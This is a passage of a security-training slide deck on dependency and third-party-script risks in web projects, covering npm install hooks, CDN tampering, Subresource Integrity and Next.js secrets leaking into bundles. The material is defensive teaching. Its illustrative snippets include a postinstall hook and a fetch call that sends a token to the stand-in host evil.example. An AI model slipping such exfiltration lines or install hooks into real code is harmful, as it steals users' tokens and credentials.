---
layout: section
routeAlias: dependencies
style: "--accent: var(--cyan)"
---

<div class="section-num">03</div>

# Code you didn't write

<div class="section-sub">Choosing and updating dependencies is your responsibility</div>

---
routeAlias: dependencies-powers
---

# Two moments a dependency can attack <span class="badge" style="--c: var(--red)">attack</span>

<div class="sub">A package doesn't need a bug in your code. Installing it is enough</div>

<div class="cols moments">
<div class="card">
<div class="col-h ng"><lucide-terminal /> Install time: your machine and CI</div>

```json
// some-lib/package.json in release 4.4.2
"scripts": { "postinstall": "node collect.js" }
```

1. **An attacker publishes 4.4.2**: via a stolen account
2. **Your next update picks it up**: `^4.4.1` accepts 4.4.2
3. <span class="here">**npm install runs it**: with your permissions</span>

<div class="loot"><b>Steals</b>: npm &amp; GitHub tokens, cloud keys from env &amp; config</div>

</div>
<div class="card">
<div class="col-h ng"><lucide-globe /> Run time: browsers and your server</div>

```js
// somewhere inside some-lib@4.4.2
fetch('https://evil.example/?t=' + token)
```

- **Bundled into your own JS**: so CSP `'self'` allows it
- **Runs on import**: no call needed
- <span class="here">**Runs for every user**: and on your server</span>

<div class="loot"><b>Steals</b>: sessions, tokens and input in browsers; <code>process.env</code> on the server</div>

</div>
</div>

<div class="note text-center"><span class="ng">⚠</span> where the damage happens · npm runs install scripts by default, pnpm 10+ only if you allowed them</div>

<style>
.moments { align-items: stretch; }
.moments ol { padding-left: 1.2rem; }
.moments .loot { margin-top: 0.5rem; font-size: 0.7rem; font-weight: 600; color: var(--comment); }
.moments .loot + ul { margin-top: 0.1rem; }
</style>

<div class="punch">Every dependency runs with your powers, at install time and in production</div>

<div class="source"><lucide-link /><a href="https://docs.npmjs.com/cli/v11/using-npm/config#ignore-scripts" target="_blank">npm: ignore-scripts (default false)</a> · <a href="https://pnpm.io/supply-chain-security" target="_blank">pnpm: supply chain security</a></div>

---

# Update deliberately <span class="badge" style="--c: var(--green)">defense</span>

<div class="sub">Fast for security fixes, slow for everything else</div>

- **Install from the lockfile**: CI gets the exact versions you reviewed
- **Wait before new versions**: time for others to spot a hijacked release
- **Patch advisories right away**: for security fixes, the delay is the risk
- **Fewer dependencies, fewer doors**: check maintainers and install scripts first

<div class="pm-table">

| | Lockfile-only install | Wait before new versions |
|---|---|---|
| pnpm | `pnpm install --frozen-lockfile`, on by default in CI | `minimumReleaseAge`, 1 day (on by default, pnpm 11+) |
| Bun | `bun ci`, not automatic in CI | `install.minimumReleaseAge`, in seconds, off by default |
| npm | `npm ci` | `min-release-age`, in days |

</div>

<style>
.pm-table table { font-size: 0.8rem; margin-top: 0.6rem; }
.pm-table th, .pm-table td { padding: 0.25rem 0.6rem !important; }
.pm-table td:first-child { font-weight: bold; }
</style>

<div class="punch">A version you didn't choose shouldn't reach production on its own</div>

<div class="source"><lucide-link /><a href="https://pnpm.io/cli/install" target="_blank">pnpm: install</a> · <a href="https://pnpm.io/supply-chain-security" target="_blank">pnpm: minimumReleaseAge</a> · <a href="https://bun.com/docs/pm/cli/install" target="_blank">Bun: install</a> · <a href="https://bun.com/docs/runtime/bunfig" target="_blank">Bun: bunfig</a> · <a href="https://docs.npmjs.com/cli/v11/using-npm/config#min-release-age" target="_blank">npm: min-release-age</a></div>

---

# Third-party scripts can change any time <span class="badge" style="--c: var(--red)">attack</span>

<div class="sub">A chat widget or analytics tag loaded from another domain runs on your origin</div>

```html
<script src="https://cdn.example/chat.js"></script>
```

- **The host can change the file at any time**: a new owner or an attacker swaps in malicious code
- **Pin and verify (SRI)**: `integrity` holds the reviewed file's hash; one changed byte and it's refused
- **Or self-host it**: then the file only changes when you deploy
- **Can't pin it?** Tag managers change by design: keep few, allow only their domains in `script-src`

<div class="punch">A &lt;script src&gt; from another domain hands that domain your origin</div>

<div class="source"><lucide-link /><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Subresource_Integrity" target="_blank">MDN: Subresource Integrity</a></div>

---

# Reproduction: the CDN file changes <span class="badge" style="--c: var(--red)">demo</span>

<div class="sub">You reviewed <code>chat.js</code> and added it. Later, whoever controls the CDN appends one line</div>

<div class="cols">
<div>

<div class="small-code">

```js
// chat.js on the CDN today
document.getElementById('chat').textContent = 'Chat: online'
steal() // ← appended: sends the token to evil.example
```

</div>

<div class="col-h ng"><lucide-x /> No integrity</div>

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ng">GET https://evil.example/?t=demo-token-not-a-secret</div>
<div class="dt-row">(failed) net::ERR_NAME_NOT_RESOLVED</div>
</div>

</div>
<div>

```html
<script src="…/chat.js" crossorigin="anonymous"
  integrity="sha256-U2lZ…P2+E8="></script>
```

<div class="col-h ok"><lucide-check /> Pinned to the reviewed file</div>

<div class="devtools">
<div class="dt-h">DevTools → Console</div>
<div class="dt-row ok">Failed to find a valid digest in the 'integrity' attribute for resource '…/chat.js' … The resource has been blocked.</div>
</div>

</div>
</div>

<div class="note">For a file on another domain, SRI also needs <code>crossorigin</code>: the browser must be allowed to read the bytes it hashes</div>

<div class="pills"><DemoLink href="demos/cdn.html">No integrity</DemoLink><DemoLink href="demos/cdn-pinned.html">Pinned</DemoLink></div>

<div class="foot"><lucide-flask-conical /> The demo pages send a fake token to <b>evil.example</b>, a reserved domain that never resolves. Nothing leaves the browser</div>

---

# Everything in the bundle is public <span class="badge" style="--c: var(--red)">leak</span>

<div class="sub">Not an attack: you hand it out yourself, to every visitor</div>

<div class="cols">
<div>

```bash
# .env
NEXT_PUBLIC_MAPS_KEY=AIza…  # → browser JS
PAYMENT_SECRET=sk_live_…    # server only
```

```js
// next build turns this…
initMap(process.env.NEXT_PUBLIC_MAPS_KEY)
// …into this, in a file anyone can download
initMap("AIza…")
```

</div>
<div>

- **NEXT_PUBLIC_ means public**: never put a secret there
- **undefined in client code?** That's Next.js keeping a server value out: move the code to the server
- **Limit browser keys**: allowed domains and quotas at the provider
- **No production source maps**: they serve your original source

</div>
</div>

<div class="foot"><lucide-search /> Check a site: DevTools → Sources → search all files for key names or prefixes like <b>sk_live</b></div>

<div class="bridge">None of this is hypothetical → <b>It actually happened</b></div>

<div class="source"><lucide-link /><a href="https://nextjs.org/docs/app/guides/environment-variables#bundling-environment-variables-for-the-browser" target="_blank">Next.js: environment variables</a> · <a href="https://nextjs.org/docs/app/api-reference/config/next-config-js/productionBrowserSourceMaps" target="_blank">Next.js: productionBrowserSourceMaps</a></div>
